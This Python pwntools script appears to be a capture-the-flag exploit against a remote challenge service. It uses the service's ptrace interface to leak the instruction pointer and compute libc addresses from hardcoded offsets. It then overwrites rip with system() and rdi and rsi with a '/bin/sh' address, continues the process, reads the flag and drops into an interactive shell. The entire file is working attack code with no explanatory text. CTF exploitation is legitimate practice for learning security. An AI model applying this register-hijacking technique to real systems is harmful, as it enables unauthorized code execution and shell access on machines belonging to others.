#!/usr/bin/env python3

from pwn import *
#context.log_level='debug'
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, int(PORT))
#io = process('./challenge')
def ptrace(req, addr, data, cont='1'):
 io.sendlineafter('send?', hex(req))
 io.sendlineafter('?', hex(addr))
 io.sendlineafter('?', hex(data))
 x = io.recvuntil('returned ')
 x = io.recvuntil('\n', drop=True)
 io.sendlineafter('?', cont)
 return x
#for i in range(0, 0x100, 8):
# print(i//8, ptrace(3, i, 0))# PTRACE_PEEKUSER
ip =  ptrace(3, 16*8, 0)# PTRACE_PEEKUSER
ip = int(ip, 16)
print('ip', hex(ip))
libc = ip - 0xeabc7
print(hex(libc))
system_addr = libc + 0x50D60
binsh_addr = libc + 0x1D8698
data_addr = libc + 0x2192D8
print('write rip', ptrace(6, 16*8, system_addr))# PTRACE_POKEUSER rip
print('read rdi', ptrace(3, 14*8, 0))# PTRACE_PEEKUSER
print('write rdi', ptrace(6, 14*8, binsh_addr))# PTRACE_POKEUSER rip
print('write rsi', ptrace(6, 13*8, binsh_addr))# PTRACE_POKEUSER rip
#print('write cmd', ptrace(4, data_addr, binsh_addr))# PTRACE_POKEUSER rip
print('read rdi', ptrace(3, 14*8, 0))# PTRACE_PEEKUSER


print('read rip', ptrace(3, 16*8, 0))# PTRACE_PEEKUSER
print('read rsp', ptrace(3, 19*8, 0))# PTRACE_PEEKUSER

print('cont', ptrace(7, 0, 0, b'../s*'))# PTRACE_CONT
io.recvuntil('Flag')
x = io.recvline()
print(x)
#print('read rip', ptrace(3, 16*8, 0))# PTRACE_PEEKUSER
#io.sendline(b'./s*')
#for i in range(10):
# x=io.recvline()
# print(x)
# if b'Flag' in x:
#  print(x)
#raw_input()
io.interactive()
